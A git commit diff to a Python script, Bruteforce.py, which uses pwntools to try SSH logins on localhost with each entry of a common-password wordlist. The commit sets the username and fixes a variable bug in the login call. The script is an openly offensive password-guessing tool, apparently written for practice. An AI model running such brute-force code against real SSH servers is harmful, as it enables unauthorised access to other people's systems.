7da0ebd0e3bf7c2436edb11fc1708a0a8c6939a2
Lachlan Simpson <138475757+Lachiecodes@users.noreply.github.com>
2023-12-01 14:07:43 +1100

    Update Bruteforce.py

--- Bruteforce.py
+++ Bruteforce.py
@@ -2,7 +2,7 @@ from pwn import *
 import paramiko
 
 host = "127.0.0.1"
-username = "username"
+username = "user1"
 attempts = 0
 
 with open("ssh-common-passwords.txt", "r") as password_list:
@@ -10,7 +10,7 @@ with open("ssh-common-passwords.txt", "r") as password_list:
         password=password.strip("\n")
         try:
             print("[{}] Attempting password: '{}".format(attempts, password))
-            response = ssh(host=host, user=user, password=password, timeout=1)
+            response = ssh(host=host, user=username, password=password, timeout=1)
             if response.connected():
                 print("[>] Valid password found: '{}'!".format(password))
                 response.close()
